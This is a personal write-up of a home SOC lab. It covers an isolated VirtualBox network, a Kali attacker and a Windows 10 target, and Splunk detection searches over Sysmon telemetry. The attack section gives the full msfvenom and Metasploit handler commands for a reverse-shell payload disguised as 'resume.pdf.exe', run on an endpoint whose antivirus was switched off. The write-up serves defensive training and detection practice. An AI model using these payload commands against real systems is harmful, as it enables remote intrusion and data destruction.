# SOC Home Lab: Attack and Detection with Splunk

> Based on the [SOC Home Lab Project](https://github.com/Prajwal2930/soc-home-lab-Project) by Prajwal2930. I used that guide to build the environment, then adapted it to my own hardware and worked through the attack, detection, and troubleshooting myself. Reconstructed from memory from when I ran the lab.

## Objective

Build a small, isolated security lab to practice the core SOC analyst workflow: collect endpoint telemetry with Sysmon, centralize it in Splunk, simulate a realistic endpoint compromise, and detect it by writing searches against the logs. The goal was to see an attack from both sides, running it as the attacker and then hunting it as the analyst.

## Environment

I ran this during the period I had a Windows 10 / Linux Mint dual boot on a single laptop, using VirtualBox on the Mint side to host the lab.

| Component | Details |
|---|---|
| Host | Laptop running Linux Mint (part of a Windows 10 / Mint dual boot) |
| Hypervisor | VirtualBox |
| Attacker VM | Kali Linux |
| Target VM | Windows 10 Pro |
| Logging | Sysmon on the Windows VM |
| SIEM | Splunk Enterprise (free trial), installed on the Windows VM |
| Network | VirtualBox Internal Network for attack traffic, with a separate NAT adapter for downloads |
| Endpoint posture | Windows Defender real-time protection disabled (see below) |
| Attack tooling | msfvenom, Metasploit (multi/handler) |

The host had 8 GB of RAM, well under the 16 GB the setup normally expects, so both VMs ran with reduced memory and I had to tune Splunk's indexing. More on that in Troubleshooting.

### A deliberately weak endpoint

I disabled Windows Defender's real-time protection on the Windows VM before running the attack. In a hardened environment Defender would likely have quarantined the payload, so turning it off simulates a realistic weakness: an endpoint where endpoint protection is missing, disabled, or misconfigured. This is a common precondition in real intrusions, and it is the gap that let the rest of the attack chain run.

## Attack Chain

```
Kali (attacker)                         Windows 10 (target)
     │                                        │
     │  1. msfvenom builds resume.pdf.exe      │
     │     (reverse TCP payload)               │
     │ ───────── payload delivered ──────────► │
     │                                        │  2. User runs the fake PDF
     │ ◄──── reverse shell on port 4444 ────── │     (endpoint has no AV)
     │  3. Meterpreter session                 │
     │ ─── discovery + file deletion ───────►  │  4. Impact
     │                                        │
     ▼                                        ▼
         Sysmon records every stage  ──►  Splunk (detection)
```

## Build

### 1. Isolated network

Put both VMs on a VirtualBox **Internal Network**, which carries traffic only between VMs on the same named network. Unlike host-only, even the host machine cannot see it, so the attack traffic between Kali and Windows was fully contained. Since the lab runs live malware, that isolation was the whole point: nothing could reach my real network.

For the few tasks that needed internet (installing Splunk and Sysmon, updating Kali), I used a separate **NAT** adapter, which gives a VM outbound internet through the host but no inbound path back. Keeping downloads on NAT and the attack on the Internal Network meant the malware path and the internet path never overlapped.

### 2. Virtual machines

- **Kali Linux** as the attacker, updated with `sudo apt update && sudo apt upgrade -y`.
- **Windows 10 Pro** as the target.

### 3. Logging and SIEM

- Installed **Sysmon** on the Windows VM to capture detailed process, network, and file telemetry.
- Installed **Splunk Enterprise** on the same VM and pointed it at the Sysmon operational log so the events were indexed and searchable.

### 4. The attack

On Kali, built the payload disguised with a double extension so it looks like a PDF:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=4444 -f exe -o resume.pdf.exe
```

Started the listener in Metasploit:

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <kali-ip>
set LPORT 4444
exploit
```

Ran `resume.pdf.exe` on the Windows VM to open the reverse shell.

### 5. Post-exploitation

Once the Meterpreter session connected, I browsed the Windows filesystem from Kali and deleted a folder named "important files" to demonstrate real impact, not just proof of access. This turns the exercise from "I got a shell" into a full intrusion with something concrete to detect at the end.

## Detection

Sysmon records each stage of this attack, so each stage has a search that surfaces it. These are the queries that identify the activity in Splunk, keyed to the Sysmon event that captures it.

A note on Defender: because real-time protection was off on this host, the payload was never quarantined, which is exactly why detection fell to Sysmon and Splunk. On a hardened endpoint, Defender logs would be a second source worth searching. Here, the Sysmon telemetry is the detection surface.

**Payload execution (Sysmon Event ID 1, Process Create)**

Finds the fake PDF running and shows what launched it:

```spl
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*resume.pdf.exe*"
| table _time, Computer, User, ParentImage, Image, CommandLine
```

**Double-extension hunt (Sysmon Event ID 1)**

A more general version that catches any process masquerading with a fake document extension, not just this one filename:

```spl
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| regex Image="(?i)\.(pdf|docx?|xlsx?|jpg|png)\.exe$"
| table _time, Computer, User, Image, CommandLine
```

**Command and control (Sysmon Event ID 3, Network Connection)**

Flags the outbound reverse shell to the attacker on port 4444:

```spl
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3
DestinationPort=4444
| table _time, Image, SourceIp, DestinationIp, DestinationPort
```

**File deletion / impact (Sysmon Event ID 23, File Delete)**

Surfaces the destruction stage:

```spl
index=* source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=23
| table _time, Image, TargetFilename, User
```

The strongest single signal here is the chain: a process with a double extension (EID 1) making an outbound connection on a non-standard port (EID 3) and then deleting files (EID 23), all from the same image. One of those alone could be benign. Together they are the whole attack.

## Alerting

I configured a Splunk alert on the detection logic so the activity would be flagged automatically rather than only on manual search. The natural trigger for this attack is the command-and-control signal: a saved search on the port 4444 network-connection query, set to alert when the result count is greater than zero.

## MITRE ATT&CK Mapping

| Stage in this lab | Technique | ID |
|---|---|---|
| Payload disguised as `resume.pdf.exe` | Masquerading: Double File Extension | T1036.007 |
| User runs the fake PDF | User Execution: Malicious File | T1204.002 |
| Meterpreter command execution | Command and Scripting Interpreter | T1059 |
| Reverse TCP callback on port 4444 | Non-Standard Port | T1571 |
| Browsing the target filesystem | File and Directory Discovery | T1083 |
| Deleting the "important files" folder | Data Destruction | T1485 |

## Issues and Troubleshooting

### No session on the first attempt

The first payload run did not return a Meterpreter session: Windows Defender was blocking the executable on the target. I went to the Windows VM and disabled real-time protection, then re-checked that the LHOST and LPORT matched between the payload and the listener. The session connected on the next attempt.

This is the step that creates the weak endpoint described above. In a real intrusion the attacker does not get to switch the defender's AV off from the console, so treat it as the precondition that makes the rest of the lab possible, not as part of the attack.

### Splunk performance on limited hardware

With only 8 GB of RAM and two VMs running at once, Splunk was slow to load and index events. I tuned its indexing throughput so it would stop trying to process data faster than the host could handle, which made searches usable again. This is set by the thruput limit in `limits.conf`:

```
[thruput]
maxKBps = <reduced value>
```

Working inside a tight resource budget is a useful lesson in itself: real environments have constraints, and a SIEM has to be tuned to the hardware it runs on.

## Outcome

I built a working, isolated attack-and-detect lab, ran a full intrusion from delivery through impact, and worked out how that activity surfaces in Splunk through Sysmon telemetry. Seeing the same event from both the attacker's and the analyst's side is what made the detection logic stick.

## What I'd Extend

- Build **dashboards** that lay the attack out as a timeline, so the delivery, C2, and impact stages read at a glance instead of as separate searches.
- Add more attack techniques (credential access, persistence) and write detections for each.
- Translate the searches into **Sigma rules** so the detections are portable to other SIEMs.
- Re-run on hardware with more RAM to remove the performance ceiling.

## Skills Practiced

- Building an isolated virtual lab for safe malware analysis
- Endpoint telemetry with Sysmon and log centralization in Splunk
- Writing SPL detection searches tied to specific attacker behavior
- Mapping an intrusion to the MITRE ATT&CK framework
- Understanding an attack end to end, from payload creation to post-exploitation impact
- Tuning a SIEM to run within real hardware constraints
